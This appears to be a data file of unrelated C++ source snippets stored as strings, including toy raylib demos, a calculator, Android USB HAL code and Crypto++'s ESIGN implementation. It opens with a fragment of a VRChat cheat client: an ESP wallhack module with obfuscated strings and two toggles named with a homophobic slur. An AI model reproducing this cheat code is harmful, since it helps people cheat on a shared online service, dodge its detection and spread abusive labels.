dst, int32_t dstOffset, int32_t count);\n\t\t\tSystem_Byte_array* get_bytes(int32_t value);\n\t\t}\n\n\t\tnamespace PhotonLoadBalancingClient {\n\t\t\tvoid OnEvent(________________________1142_o* client, ExitGames_Client_Photon_EventData_o* data);\n\t\t}\n\n\t\tnamespace VRChatSDKBaseInputManager {\n\t\t\tvoid EnableObjectHighlight(Unity::CGameObject* r, bool enable);\n\t\t}\n\t}\n\n\tnamespace Custom {\n\t\tvoid SendChatboxEvent(std::string text);\n\t\tvoid ObjectHighlight(Unity::CComponent* Transform, bool state);\n\t\tvoid ObjectHighlight(Unity::CTransform* Transform, bool state);\n\t\tvoid AvatarHighlight(Unity::CComponent* Transform, bool state);\n\t\tvoid AvatarHighlight(Unity::CTransform* Transform, bool state);\n\t}\n}\n\nESP::ESP() : Module(obf(\"ESP\"), obf(\"Render Entities through Walls\"), VK_DIVIDE) {\n\tPlateColor = &SetManager::i().add(new Set(ImGuiHelper::rgbaToVec4(0, 0, 0, 255), obf(\"PlateColor\"), getName())).getVec4();\n\tCapColor = &SetManager::i().add(new Set(ImGuiHelper::rgbaToVec4(127.5, 186.405, 255, 255), obf(\"CapColor\"), getName())).getVec4();\n\tESPOutlineCol = &SetManager::i().add(new Set(ImGuiHelper::rgbaToVec4(165, 55, 253, 255), obf(\"ESPOutlineCol\"), getName())).getVec4();\n\tcolHealthBar = &SetManager::i().add(new Set(ImGuiHelper::rgbaToVec4(114, 144, 222, 200), obf(\"colHealthBar\"), getName())).getVec4();\n\tcolHeadCircle = &SetManager::i().add(new Set(ImGuiHelper::rgbaToVec4(188, 169, 154, 200), obf(\"colHeadCircle\"), getName())).getVec4();\n\n\tThirdPerson = &SetManager::i().add(new Set(false, obf(\"ThirdPerson\"), getName())).getBVal();\n\tThirdPersonInvert = &SetManager::i().add(new Set(false, obf(\"ThirdPersonInvert\"), getName())).getBVal();\n\tThirdPCamFOV = &SetManager::i().add(new Set(90.0f, 90.0f, 180.f, obf(\"flyspeed\"), getName())).getVec3f();\n\tThirdPCamMode = &SetManager::i().add(new Set(0, obf(\"ThirdPCamMode\"), getName())).getIVal();\n\tThirdPHotkey = &SetManager::i().add(new Set(0, obf(\"ThirdPHotkey\"), getName())).getIVal();\n\tThirdPInvertHotkey = &SetManager::i().add(new Set(0, obf(\"ThirdPInvertHotkey\"), getName())).getIVal();\n\n\tNameplateRecolor = &SetManager::i().add(new Set(false, obf(\"NameplateRecolor\"), getName())).getBVal();\n\tNameplateRGB = &SetManager::i().add(new Set(false, obf(\"NameplateRGB\"), getName())).getBVal();\n\tNameplateDetails = &SetManager::i().add(new Set(false, obf(\"NameplateDetails\"), getName())).getBVal();\n\tFewTagsEnabled = &SetManager::i().add(new Set(false, obf(\"FewTagsEnabled\"), getName())).getBVal();\n\tNPDisplayPing = &SetManager::i().add(new Set(false, obf(\"NPDisplayPing\"), getName())).getBVal();\n\tNPDisplayFPS = &SetManager::i().add(new Set(false, obf(\"NPDisplayFPS\"), getName())).getBVal();\n\tNPDisplayPlatform = &SetManager::i().add(new Set(false, obf(\"NPDisplayPlatform\"), getName())).getBVal();\n\tNPFagDetector = &SetManager::i().add(new Set(false, obf(\"NPFagDetector\"), getName())).getBVal();\n\tNPFemboyDetector = &SetManager::i().add(new Set(false, obf(\"NPFemboyDetector\"), getName())).getBVal();\n\tavatarWallhack = &SetManager::i().add(new Set(false, obf(\"avatarWallhack\"), getName())).getBVal();\n\tPickupESP = &SetManager::i().add(new Set(false, obf(\"PickupESP\"), getName())).getBVal();\n\tAvatarOutlineEsp = &SetManager::i().add(new Set(false, obf(\"AvatarOutlineEsp\"), getName())).getBVal();\n\tCapsuleESP = &SetManager::i().add(new Set(false, obf(\"CapsuleESP\"), getName())).getBVal();\n\tPlayerSnaplines = &SetManager::i().add(new Set(false, obf(\"PlayerSnaplines\"), getName())).getBVal();\n\tSnaplineStyle = &SetManager::i().add(new Set(1, obf(\"SnaplineStyle\"), getName())).getIVal();\n\n\tisSkeletonHealthBased = &SetManager::i().add(new Set(false, obf(\"isSkeletonHealthBased\"), getName())).getBVal();\n\tis2DBoxHealthBased = &SetManager::i().add(new Set(false, obf(\"is2DBoxHealthBased\"), getName())).getBVal();\n\tisHealthBarHealthBased = &SetManager::i().add(new Set(false, obf(\"isHealthBarHealthBased\"), getName())).getBVal();\n\tisHeadCircleHealthBased",
    "#include <iostream>\nusing namespace std;\n\nvoid cls();\nint add();\nint sub();\n\nint main() {\n    int user_input, result;\n    \n    do {\n        cls();\n        cout<<\"C++ Calculator\\n1. Add\\n2. Subtract\\n3. Exit\\nEnter your choice: \";\n        cin>>user_input;\n\n        switch(user_input) {\n            case 1:\n                result = add();\n                break;\n            case 2:\n                result = sub();\n                break;\n            case 3:\n                cls();\n                cout<<\"Program exited.\";\n                cin.get();\n                exit(0);\n                break;\n            default:\n                cls();\n                cout<<\"Invalid input.\\n\";\n                cin.get();\n        }\n    }while(true);\n}\n\nvoid cls() {\n    cout<<\"\\033[2J\\033[1;1H\"; // clear screen\n}\n\nint add() {\n    int x, y;\n    cls();\n    cout<<\"ADD\\n\";\n    cout<<\"Enter first number to add: \";\n    cin>>x;\n    cin.ignore();\n    cls();\n    cout<<\"ADD\\n\";\n    cout<<\"Enter second number to add: \";\n    cin>>y;\n    cin.ignore();\n    cls();\n    cout<<\"Result: \"<<x + y;\n    cin.get();\n    return x + y;\n}\n\nint sub() {\n    int x, y;\n    cls();\n    cout<<\"SUB\\n\";\n    cout<<\"Enter first number: \";\n    cin>>x;\n    cin.ignore();\n    cls();\n    cout<<\"SUB\\n\";\n    cout<<\"Enter second number: \";\n    cin>>y;\n    cin.ignore();\n    cls();\n    cout<<\"Result: \"<<x - y;\n    cin.get();\n    return x - y;\n}\n",
    "#include \"raylib.h\"\n#include <ctime>\n#include <iostream>\n#include <unistd.h>\n\nenum TileType { BEDROCK = -1, EMPTY = 0, BLOCK = 1, SAND = 2 };\nint currentType;\n\nbool IsBlockBelow(int tilemap[][18], int rows, int cols, int row, int col) {\n  return (row + 1 < rows) && (tilemap[row + 1][col] == BLOCK);\n}\n\nbool IsGapRight(int tilemap[][18], int rows, int cols, int row, int col) {\n  return (row + 1 < rows) && (tilemap[row + 1][col + 1] == EMPTY);\n}\n\nbool IsGapLeft(int tilemap[][18], int rows, int cols, int row, int col) {\n  return (row + 1 < rows) && (tilemap[row + 1][col - 1] == EMPTY);\n}\n\nint main() {\n  const int tileHeight = 32;\n  const int tileWidth = 32;\n\n  const int rows = 18;\n  const int cols = 18;\n\n  int tilemap[rows][cols]{\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1}, //\n      {-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1}, //\n  };\n\n  InitWindow(576, 576, \"falling sand\");\n  SetTargetFPS(60);\n\n  while (WindowShouldClose() == false) {\n    BeginDrawing();\n    ClearBackground(BLACK);\n\n    int mouseY = GetMouseX() / tileWidth;\n    int mouseX = GetMouseY() / tileHeight;\n\n    if (mouseY >= 0 && mouseY < cols && mouseX >= 0 && mouseX < rows) {\n      DrawRectangle(mouseY * tileWidth, mouseX * tileHeight, tileWidth, tileHeight, Color{255, 255, 255, 128});\n    }\n\n    if (IsKeyPressed(KEY_ONE)) {\n      currentType = 1;\n    }\n\n    if (IsKeyPressed(KEY_TWO)) {\n      currentType = 2;\n    }\n\n    if (tilemap[mouseX][mouseY] != BEDROCK) {\n      if (IsMouseButtonDown(0)) {\n        tilemap[mouseX][mouseY] = currentType;\n      }\n\n      if (IsMouseButtonDown(1)) {\n        tilemap[mouseX][mouseY] = EMPTY;\n      }\n    }\n\n    for (int row = rows - 1; row >= 0; row--) {\n      for (int col = 0; col < cols; col++) {\n        if (tilemap[row][col] == SAND) {\n          // SAND FALLING LOGIC\n          if (!IsBlockBelow(tilemap, rows, cols, row, col) && tilemap[row + 1][col] == EMPTY) {\n            tilemap[row + 1][col] = SAND;\n            tilemap[row][col] = EMPTY;\n          } else {\n            if (IsGapRight(tilemap, rows, cols, row, col) && (tilemap[row][col + 1] == EMPTY) &&\n                tilemap[row + 1][col] != EMPTY) {\n              if (IsGapRight(tilemap, rows, cols, row, col) && tilemap[row + 1][col + 1] == EMPTY)\n                tilemap[row + 1][col + 1] = SAND;\n              tilemap[row][col] = EMPTY;\n            }\n            if (IsGapLeft(tilemap, rows, cols, row, col) && tilemap[row][col - 1] == EMPTY &&\n                tilemap[row + 1][col] != EMPTY) {\n              if (IsGapLeft(tilemap, rows, cols, row, col) && tilemap[row + 1][col - 1] == EMPTY)\n                tilemap[row + 1][col - 1] = SAND;\n              tilemap[row][col] = EMPTY;\n            }\n          }\n        }\n      }\n    }\n\n    for (int row = 0; row < rows; row++) {\n      for (int col = 0; col < cols; col++) {\n        int x = col * tileWidth;\n        int y = row * tileHeight;\n\n        if (tilemap[row][col] == BLOCK) {\n          DrawRectangle(x, y, tileWidth, tileHeight, WHITE);\n        } \n\n        if (tilemap[row][col] == SAND) {\n          DrawRectangle(x, y, tileWidth, tileHeight, YELLOW);\n        }\n      }\n    }\n\n    // UI\n    DrawText(TextFormat(\"Current Block: %d\", currentType), 576 / 2, 0 + 10, 5, WHITE);\n    DrawFPS(0 + 10, 0 + 10);\n    DrawText(\"1 Block\", 576 / 2 - 40, 576 - 10, 5, WHITE);\n    DrawText(\"2 Sand\", 576 / 2 + 40, 576 - 10, 5, WHITE);\n\n    EndDrawing();\n  }\n\n  CloseWindow();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ecommerceapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\nclass Solution {\n  public:\n    vector<int> findSplit(vector<int> &arr)\n{\n    int sum = accumulate(arr.begin(), arr.end(), 0);\n    if (sum % 3 != 0)\n        return {-1, -1};\n    int i = -1, j = -1, count = 0;\n    int p_sum = 0;\n    int target = sum / 3;\n    for (int k = 0; k < arr.size(); k++)\n    {\n        p_sum += arr[k];\n        if (p_sum == target)\n        {\n            if (count == 0)\n            {\n                i = k;\n                count++;\n            }\n            else if (count == 1)\n            {\n                j = k;\n                count++;\n                break;\n            }\n            p_sum = 0;\n        }\n    }\n    if (count == 2 && i != -1 && j != -1)\n    {\n        return {i, j};\n    }\n    return {-1, -1};\n}\n};\nint main() {\n    int test_cases;\n    cin >> test_cases;\n    cin.ignore();\n    while (test_cases--) {\n        string input;\n        vector<int> arr;\n        getline(cin, input);\n        stringstream ss(input);\n        int number;\n        while (ss >> number) {\n            arr.push_back(number);\n        }\n        Solution ob;\n        vector<int> result = ob.findSplit(arr);\n        if (result[0] == -1 && result[1] == -1 || result.size() != 2) {\n            cout << \"false\" << endl;\n        } else {\n            int sum1 = 0, sum2 = 0, sum3 = 0;\n            for (int i = 0; i < arr.size(); i++) {\n                if (i <= result[0])\n                    sum1 += arr[i];\n                else if (i <= result[1])\n                    sum2 += arr[i];\n                else\n                    sum3 += arr[i];\n            }\n            if (sum1 == sum2 && sum2 == sum3) {\n                cout << \"true\" << endl;\n            } else {\n                cout << \"false\" << endl;\n            }\n        }\n        cout << \"~\" << endl;\n    }\n    return 0;\n}",
    "/*\n * Copyright (C) 2017 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.usb@1.3-service-mediatekv2\"\n\n#include <android-base/file.h>\n#include <android-base/logging.h>\n#include <android-base/parseint.h>\n#include <android-base/strings.h>\n#include <assert.h>\n#include <chrono>\n#include <dirent.h>\n#include <pthread.h>\n#include <regex>\n#include <stdio.h>\n#include <sys/types.h>\n#include <thread>\n#include <unistd.h>\n#include <unordered_map>\n\n#include <cutils/uevent.h>\n#include <sys/epoll.h>\n#include <utils/Errors.h>\n#include <utils/StrongPointer.h>\n\n#include \"Usb.h\"\n\nnamespace android {\nnamespace hardware {\nnamespace usb {\nnamespace V1_3 {\nnamespace implementation {\n\n#define PULLUP_PATH \"/config/usb_gadget/g1/UDC\"\n#define UDC_PATH \"/sys/class/udc/\"\n#define USB_DATA_PATH1 \"cmode\"\n#define USB_DATA_PATH2 \"mode\"\n\nconstexpr char kUsbController[] = \"sys.usb.controller\";\n\n// Set by the signal handler to destroy the thread\nvolatile bool destroyThread;\n\nint32_t readFile(const std::string &filename, std::string *contents) {\n  FILE *fp;\n  ssize_t read = 0;\n  char *line = NULL;\n  size_t len = 0;\n\n  fp = fopen(filename.c_str(), \"r\");\n  if (fp != NULL) {\n    if ((read = getline(&line, &len, fp)) != -1) {\n      char *pos;\n      if ((pos = strchr(line, '\\n')) != NULL) *pos = '\\0';\n      *contents = line;\n    }\n    free(line);\n    fclose(fp);\n    return 0;\n  } else {\n    ALOGE(\"fopen failed\");\n  }\n\n  return -1;\n}\n\nReturn<bool> Usb::enableUsbDataSignal(bool enable) {\n    bool result = true;\n    std::string gadgetName = GetProperty(kUsbController, \"\");\n    std::string dataPath1 = UDC_PATH + gadgetName + \"/device/\" + USB_DATA_PATH1;\n    std::string dataPath2 = UDC_PATH + gadgetName + \"/device/\" + USB_DATA_PATH2;\n    std::string mode;\n\n    ALOGI(\"Userspace turn %s USB data signaling\", enable ? \"on\" : \"off\");\n\n    if (gadgetName.empty()) {\n        ALOGI(\"can't get controller name\");\n        result = false;\n    }\n\n    if (enable) {\n        if (readFile(dataPath1, &mode)) {\n            if (readFile(dataPath2, &mode)) {\n                ALOGE(\"Not able to check usb mode\");\n                result = false;\n                goto done;\n            }\n        }\n\n        if (mode == \"3\") {\n            ALOGI(\"Usb is force on mode\");\n        } else if (!WriteStringToFile(\"1\", dataPath1)) {\n            if (!WriteStringToFile(\"1\", dataPath2)) {\n                ALOGE(\"Not able to turn on usb connection\");\n                result = false;\n            }\n        }\n\n        usleep(100000);\n\n        if (!WriteStringToFile(gadgetName, PULLUP_PATH)) {\n            ALOGE(\"Gadget cannot be pulled up\");\n            result = false;\n        }\n    } else {\n        if (!WriteStringToFile(\"0\", dataPath1)) {\n            if (!WriteStringToFile(\"0\", dataPath2)) {\n                ALOGE(\"Not able to turn on usb connection\");\n                result = false;\n            }\n        }\n\n        usleep(100000);\n\n        if (!WriteStringToFile(\"none\", PULLUP_PATH)) {\n            ALOGE(\"Gadget cannot be pulled down\");\n            result = false;\n        }\n    }\n\ndone:\n    return result;\n}\n\nStatus queryMoistureDetectionStatus(hidl_vec<PortStatus> *currentPortStatus_1_2) {\n  std::string enabled, status, path, DetectedPath;\n\n  if (currentPortStatus_1_2 == NULL || currentPortStatus_1_2->size() == 0) {\n      ALOGE(\"currentPortStatus_1_2 is not available\");\n      return Status::ERROR;\n  }\n\n  (*currentPortStatus_1_2)[0].supportedContaminantProtectionModes = 0;\n  (*currentPortStatus_1_2)[0].supportedContaminantProtectionModes |=\n      V1_2::ContaminantProtectionMode::FORCE_SINK;\n  (*currentPortStatus_1_2)[0].contaminantProtectionStatus =\n      V1_2::ContaminantProtectionStatus::NONE;\n  (*currentPortStatus_1_2)[0].contaminantDetectionStatus =\n      V1_2::ContaminantDetectionStatus::DISABLED;\n  (*currentPortStatus_1_2)[0].supportsEnableContaminantPresenceDetection = false;\n  (*currentPortStatus_1_2)[0].supportsEnableContaminantPresenceProtection = false;\n\n  (*currentPortStatus_1_2)[0].contaminantDetectionStatus =\n      V1_2::ContaminantDetectionStatus::NOT_DETECTED;\n\n  ALOGI(\"ContaminantDetectionStatus:%d ContaminantProtectionStatus:%d\",\n        (*currentPortStatus_1_2)[0].contaminantDetectionStatus,\n        (*currentPortStatus_1_2)[0].contaminantProtectionStatus);\n\n  return Status::SUCCESS;\n}\n\nstd::string appendRoleNodeHelper(const std::string &portName,\n                                 PortRoleType type) {\n  std::string ",
    "#include <raylib.h>\n#include \"Ball.hpp\"\n#include <vector>\n#include <random>\n\nint amount = 10;\nint windowHeight = 1800;\nint windowLength = 800;\nint frameRate = 60;\nint speedRange = 10;\n\nint randomNumber(int min, int max) {\n     std::random_device rd;\n     std::mt19937 gen(rd());\n     std::uniform_int_distribution<> dis(min, max);\n\n     return dis(gen);\n}\n\nint main() {\n     SetTraceLogLevel(LOG_ERROR);\n     InitWindow(windowHeight, windowLength, \"Ball Animation\");\n     SetTargetFPS(frameRate);\n\n     std::vector<Ball> balls;\n     std::vector<Color> colors = {RED, BLUE, GREEN, YELLOW, ORANGE, PURPLE};\n\n     for(int i = 0; i < amount; i++) {\n          Color color = colors[i % colors.size()];\n          float radius = randomNumber(5, 100);\n          float positionX = randomNumber(radius + 1, GetScreenWidth() - radius - 1);\n          float positionY = randomNumber(radius + 1, GetScreenHeight() - radius - 1);\n          float velocityX = randomNumber(-speedRange, speedRange);\n          float velocityY = randomNumber(-speedRange, speedRange);\n\n          Ball ballElement = Ball(radius, {positionX, positionY}, {velocityX, velocityY}, color);\n          balls.push_back(ballElement);\n     }\n\n     while(!WindowShouldClose()) {\n          BeginDrawing();\n\n          ClearBackground(LIGHTGRAY);\n\n          for(int i = 0; i < balls.size(); i++) {\n               balls[i].update();\n               balls[i].checkCollision();\n               balls[i].draw();\n          }\n\n          EndDrawing();\n     }\n\n     CloseWindow();\n\n     return 0;\n}",
    "// esign.cpp - written and placed in the public domain by Wei Dai\n\n#include \"pch.h\"\n#include \"esign.h\"\n#include \"asn.h\"\n#include \"modarith.h\"\n#include \"nbtheory.h\"\n#include \"sha.h\"\n#include \"algparam.h\"\n\nNAMESPACE_BEGIN(CryptoPP)\n\nvoid ESIGN_TestInstantiations()\n{\n\tESIGN<SHA>::Verifier x1(1, 1);\n\tESIGN<SHA>::Signer x2(NullRNG(), 1);\n\tESIGN<SHA>::Verifier x3(x2);\n\tESIGN<SHA>::Verifier x4(x2.GetKey());\n\tESIGN<SHA>::Verifier x5(x3);\n\tESIGN<SHA>::Signer x6 = x2;\n\n\tx6 = x2;\n\tx3 = ESIGN<SHA>::Verifier(x2);\n\tx4 = x2.GetKey();\n}\n\nvoid ESIGNFunction::BERDecode(BufferedTransformation &bt)\n{\n\tBERSequenceDecoder seq(bt);\n\t\tm_n.BERDecode(seq);\n\t\tm_e.BERDecode(seq);\n\tseq.MessageEnd();\n}\n\nvoid ESIGNFunction::DEREncode(BufferedTransformation &bt) const\n{\n\tDERSequenceEncoder seq(bt);\n\t\tm_n.DEREncode(seq);\n\t\tm_e.DEREncode(seq);\n\tseq.MessageEnd();\n}\n\nInteger ESIGNFunction::ApplyFunction(const Integer &x) const\n{\n\tDoQuickSanityCheck();\n\treturn STDMIN(a_exp_b_mod_c(x, m_e, m_n) >> (2*GetK()+2), MaxImage());\n}\n\nbool ESIGNFunction::Validate(RandomNumberGenerator &rng, unsigned int level) const\n{\n\tbool pass = true;\n\tpass = pass && m_n > Integer::One() && m_n.IsOdd();\n\tpass = pass && m_e >= 8 && m_e < m_n;\n\treturn pass;\n}\n\nbool ESIGNFunction::GetVoidValue(const char *name, const std::type_info &valueType, void *pValue) const\n{\n\treturn GetValueHelper(this, name, valueType, pValue).Assignable()\n\t\tCRYPTOPP_GET_FUNCTION_ENTRY(Modulus)\n\t\tCRYPTOPP_GET_FUNCTION_ENTRY(PublicExponent)\n\t\t;\n}\n\nvoid ESIGNFunction::AssignFrom(const NameValuePairs &source)\n{\n\tAssignFromHelper(this, source)\n\t\tCRYPTOPP_SET_FUNCTION_ENTRY(Modulus)\n\t\tCRYPTOPP_SET_FUNCTION_ENTRY(PublicExponent)\n\t\t;\n}\n\n// *****************************************************************************\n\nvoid InvertibleESIGNFunction::GenerateRandom(RandomNumberGenerator &rng, const NameValuePairs &param)\n{\n\tint modulusSize = 1023*2;\n\tparam.GetIntValue(\"ModulusSize\", modulusSize) || param.GetIntValue(\"KeySize\", modulusSize);\n\n\tif (modulusSize < 24)\n\t\tthrow InvalidArgument(\"InvertibleESIGNFunction: specified modulus size is too small\");\n\n\tif (modulusSize % 3 != 0)\n\t\tthrow InvalidArgument(\"InvertibleESIGNFunction: modulus size must be divisible by 3\");\n\n\tm_e = param.GetValueWithDefault(\"PublicExponent\", Integer(32));\n\n\tif (m_e < 8)\n\t\tthrow InvalidArgument(\"InvertibleESIGNFunction: public exponents less than 8 may not be secure\");\n\n\t// VC70 workaround: putting these after primeParam causes overlapped stack allocation\n\tConstByteArrayParameter seedParam;\n\tSecByteBlock seed;\n\n\tconst Integer minP = Integer(204) << (modulusSize/3-8);\n\tconst Integer maxP = Integer::Power2(modulusSize/3)-1;\n\tAlgorithmParameters primeParam = MakeParameters(\"Min\", minP)(\"Max\", maxP)(\"RandomNumberType\", Integer::PRIME);\n\n\tif (param.GetValue(\"Seed\", seedParam))\n\t{\n\t\tseed.resize(seedParam.size() + 4);\n\t\tmemcpy(seed + 4, seedParam.begin(), seedParam.size());\n\n\t\tPutWord(false, BIG_ENDIAN_ORDER, seed, (word32)0);\n\t\tm_p.GenerateRandom(rng, CombinedNameValuePairs(primeParam, MakeParameters(\"Seed\", ConstByteArrayParameter(seed))));\n\t\tPutWord(false, BIG_ENDIAN_ORDER, seed, (word32)1);\n\t\tm_q.GenerateRandom(rng, CombinedNameValuePairs(primeParam, MakeParameters(\"Seed\", ConstByteArrayParameter(seed))));\n\t}\n\telse\n\t{\n\t\tm_p.GenerateRandom(rng, primeParam);\n\t\tm_q.GenerateRandom(rng, primeParam);\n\t}\n\n\tm_n = m_p * m_p * m_q;\n\n\tassert(m_n.BitCount() == modulusSize);\n}\n\nvoid InvertibleESIGNFunction::BERDecode(BufferedTransformation &bt)\n{\n\tBERSequenceDecoder privateKey(bt);\n\t\tm_n.BERDecode(privateKey);\n\t\tm_e.BERDecode(privateKey);\n\t\tm_p.BERDecode(privateKey);\n\t\tm_q.BERDecode(privateKey);\n\tprivateKey.MessageEnd();\n}\n\nvoid InvertibleESIGNFunction::DEREncode(BufferedTransformation &bt) const\n{\n\tDERSequenceEncoder privateKey(bt);\n\t\tm_n.DEREncode(privateKey);\n\t\tm_e.DEREncode(privateKey);\n\t\tm_p.DEREncode(privateKey);\n\t\tm_q.DEREncode(privateKey);\n\tprivateKey.MessageEnd();\n}\n\nInteger InvertibleESIGNFunction::CalculateRandomizedInverse(RandomNumberGenerator &rng, const Integer &x) const \n{\n\tDoQuickSanityCheck();\n\n\tInteger pq = m_p * m_q;\n\tInteger p2 = m_p * m_p;\n\tInteger r, z, re, a, w0, w1;\n\n\tdo\n\t{\n\t\tr.Randomize(rng, Integer::Zero(), pq);\n\t\tz = x << (2*GetK()+2);\n\t\tre = a_exp_b_mod_c(r, m_e, m_n);\n\t\ta = (z - re) % m_n;\n\t\tInteger::Divide(w1, w0, a, pq);\n\t\tif (w1.NotZero())\n\t\t{\n\t\t\t++w0;\n\t\t\tw1 = pq - w1;\n\t\t}\n\t}\n\twhile ((w1 >> 2*GetK()+1).IsPositive());\n\n\tModularArithmetic modp(m_p);\n\tInteger t = modp.Divide(w0 * r % m_p, m_e * re % m_p);\n\tInteger s = r + t*pq;\n\tassert(s < m_n);\n/*\n\tusing namespace std;\n\tcout << \"f = \" << x << endl;\n\tcout << \"r = \" << r << endl;\n\tcout << \"z = \" << z << endl;\n\tcout << \"a = \" << a << endl;\n\tcout << \"w0 = \" << w0 << endl;\n\tcout << \"w1 = \" << w1 << endl;\n\tcout << \"t = \" << t << endl;\n\tcout << \"s = \" << s << endl;\n*/\n\treturn s;\n}\n\nbool InvertibleESIGNFunction::Validate(RandomNumberGenerator &rng, unsigned int level) const\n{\n\tbool pass = ESIGNFunction::Validate(rng, level);\n\tpass = pass && m_p > Integer::One() && m_p.IsOdd(",
    "#include \"roster.h\"\r\n#include \"student.h\"\r\n#include <iostream>\r\n#include <vector>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\n\r\nRoster::~Roster() {}\r\n\r\n// E3 functions\r\nvoid Roster::add(\r\n    string studentID, \r\n    string firstName,\r\n    string lastName,\r\n    string emailAddress,\r\n    int age, \r\n    int daysInCourse1,\r\n    int daysInCourse2,\r\n    int daysInCourse3,\r\n    DegreeProgram degreeProgram) {\r\n\r\n    this->ensureSize();\r\n\r\n    int avgCourseDays[] = {daysInCourse1, daysInCourse2, daysInCourse3};\r\n    classRosterArray[numStudents] = new Student(\r\n        studentID, firstName, lastName, emailAddress, age, avgCourseDays, degreeProgram\r\n    );\r\n\r\n    numStudents++;\r\n}\r\n\r\nvoid Roster::remove(string studentID) {\r\n    bool found = false;\r\n    int length = this->numStudents;\r\n\r\n    for(int i = 0; i < length; i++) {\r\n        if (found) {\r\n            // Copy the remainder of the array into the \"gap\"\r\n            classRosterArray[i-1] = classRosterArray[i];\r\n            continue;\r\n        }\r\n        \r\n        if( this->classRosterArray[i] != nullptr && \r\n            this->classRosterArray[i]->getStudentID() == studentID) {\r\n            \r\n            // Delete the item\r\n            delete classRosterArray[i];\r\n            found = true;\r\n        }\r\n    }\r\n\r\n    if (found) {\r\n        numStudents--;\r\n    } else {\r\n        cout << \"Student was not found\" << endl;\r\n    }\r\n}\r\n\r\nvoid Roster::printAll() {\r\n    for(int i = 0; i < numStudents; i++) {\r\n        classRosterArray[i] -> Student::print();\r\n    }\r\n}\r\n\r\nvoid Roster::printAverageDaysInCourse(string studentID) {\r\n    for(int i = 0; i < numStudents; i++) {\r\n        if(studentID == classRosterArray[i] -> Student::getStudentID()) {\r\n            int* days = classRosterArray[i] -> getDaysToComplete();\r\n            int avgDays = (days[0] + days[1] + days[2]) / 3;\r\n\r\n            cout << avgDays << endl;\r\n        }\r\n    }\r\n}\r\n\r\nvoid Roster::printInvalidEmails() {\r\n    for(int i = 0; i < numStudents; i++) {\r\n        string email = classRosterArray[i] -> Student::getEmailAddress();\r\n        bool valid = true;\r\n        \r\n        if (email.find(' ') != string::npos) {\r\n            valid = false;\r\n        } else if (email.find('@')  == string::npos) {\r\n            valid = false;\r\n        } else if (email.find('.') == string::npos) {\r\n            valid = false;\r\n        }\r\n\r\n        if (valid == false) { cout << email << \" is invalid.\" << endl; }\r\n    }\r\n}\r\n\r\nvoid Roster::printByDegreeProgram(DegreeProgram degreeProgram) {\r\n    for(int i = 0; i < numStudents; i++) {\r\n        if (degreeProgram == classRosterArray[i] -> Student::getDegree()) {\r\n            classRosterArray[i] -> Student::print();\r\n        }\r\n    }\r\n}\r\n\r\nvoid 